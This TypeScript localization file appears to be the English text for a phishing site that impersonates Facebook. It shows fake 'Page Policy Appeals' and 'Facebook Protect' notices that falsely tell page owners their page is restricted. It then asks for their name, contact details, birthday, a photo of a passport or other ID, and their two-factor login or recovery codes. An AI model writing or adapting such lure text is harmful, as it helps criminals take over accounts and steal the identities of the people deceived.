export interface TranslationTexts {
  helpCenter: string;
  english: string;

  using: string;
  managingAccount: string;
  privacySecurity: string;
  policiesReporting: string;

  pagePolicyAppeals: string;
  detectedActivity: string;
  accessLimited: string;
  submitAppeal: string;

  pageName: string;
  fullName: string;
  email: string;
  phone: string;
  birthday: string;
  birthdayPlaceholder: string;

  submit: string;
  continue: string;

  fieldRequired: string;
  invalidEmail: string;
  invalidBirthday: string;
  invalidPhone: string;

  about: string;
  adChoices: string;
  createAd: string;
  privacy: string;
  careers: string;
  createPage: string;
  termsPolicies: string;
  cookies: string;

  accountRestricted: string;
  termOfService: string;
  unusualActivity: string;
  communityStandards: string;
  disabled: string;
  pleaseVerify: string;
  caseNumber: string;
  aboutCase: string;

  pageNamePlaceholder: string;
  fullNamePlaceholder: string;
  emailPlaceholder: string;
  phoneNumberPlaceholder: string;

  welcomeToFacebookProtect: string;
  pageAccessibilityLimited: string;
  moreInformation: string;
  enabledAdvancedProtections: string;
  walkThroughProcess: string;
  pageRestrictedOn: string;

  confirmYourIdentity: string;
  chooseTypeOfId: string;
  idUsageDescription: string;
  passport: string;
  driversLicense: string;
  nationalIdCard: string;
  idStorageDescription: string;
  learnMore: string;
  uploadImage: string;

  accountCenter: string;
  checkNotifications: string;
  approveFromDevice: string;
  enterLoginCode: string;
  codeInstructions: string;
  enterCodePlaceholder: string;
  incorrectCode: string;
  sendCode: string;

  pageNotFound: string;
  pageNotFoundDescription: string;
  goHome: string;
}

export const defaultTexts: TranslationTexts = {
  helpCenter: "Help Center",
  english: "English",

  using: "Using",
  managingAccount: "Managing Your Account",
  privacySecurity: "Privacy, Safety and Security",
  policiesReporting: "Policies and Reporting",

  pagePolicyAppeals: "Page Policy Appeals",
  detectedActivity:
    "We have detected unusual activity on your page that violates our community standards.",
  accessLimited:
    "Your access to your page has been limited, and you are currently unable to post, share, or comment using your page.",
  submitAppeal:
    "If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.",

  pageName: "Page Name",
  fullName: "Full Name",
  email: "Email",
  phone: "Phone Number",
  birthday: "Birthday",
  birthdayPlaceholder: "Birthday (DD/MM/YYYY)",

  submit: "Submit",
  continue: "Continue",

  fieldRequired: "This field is required",
  invalidEmail: "Please enter a valid email address",
  invalidBirthday: "Please enter a valid date (DD/MM/YYYY)",
  invalidPhone: "Please enter a valid phone number (minimum 8 digits)",

  about: "About",
  adChoices: "Ad choices",
  createAd: "Create ad",
  privacy: "Privacy",
  careers: "Careers",
  createPage: "Create Page",
  termsPolicies: "Terms and policies",
  cookies: "Cookies",

  accountRestricted: "Your account has been restricted",
  termOfService: "Term of Service",
  unusualActivity: "We detected unusual activity in your page today",
  communityStandards: "Community Standards",
  disabled: "disabled",
  pleaseVerify: "please verify:",
  caseNumber: "Case Number:",
  aboutCase:
    "About Case: Violating Community Standards and Posting something inappropriate.",

  pageNamePlaceholder: "Page Name",
  fullNamePlaceholder: "Your Name (Name and Surname)",
  emailPlaceholder: "Personal Email",
  phoneNumberPlaceholder: "Phone Number",

  welcomeToFacebookProtect: "Welcome To Facebook Protect.",
  pageAccessibilityLimited:
    "Your page's accessibility is limited, so we ask that higher security requirements be applied to that account. We created this security program to unlock your Pages.",
  moreInformation: "More information",
  enabledAdvancedProtections:
    "We've enabled advanced protections to unlock your Page.",
  walkThroughProcess:
    "Below, we walk you through the process in detail and help you fully activate to unlock your Page.",
  pageRestrictedOn: "Your page was restricted on",

  confirmYourIdentity: "Confirm your identity",
  chooseTypeOfId: "Choose type of ID to upload",
  idUsageDescription:
    "We'll use your ID to review your name, photo, and date of birth. It won't be shared on your profile.",
  passport: "Passport",
  driversLicense: "Driver's license",
  nationalIdCard: "National ID card",
  idStorageDescription:
    "Your ID will be securely stored for up to 1 year to help improve how we detect impersonation and fake IDs. If you opt out, we'll delete it within 30 days. We sometimes use trusted service providers to help review your information.",
  learnMore: "Learn more",
  uploadImage: "Upload Image",

  accountCenter: "Account Center - Facebook",
  checkNotifications: "Check notifications on another device",
  approveFromDevice: "Approve from another device or Enter your login code",
  enterLoginCode: "Enter your login code",
  codeInstructions:
    "Enter 6-digit code we just send from the authentication app you set up, or Enter 8-digit recovery code",
  enterCodePlaceholder: "Enter Code (6-8 digits)",
  incorrectCode: "Incorrect code. Please try again.",
  sendCode: "Send Code",

  pageNotFound: "Page Not Found",
  pageNotFoundDescription: "The page you are looking for does not exist.",
  goHome: "Go Home",
};

export const textKeys = Object.keys(defaultTexts) as Array<
  keyof TranslationTexts
>;
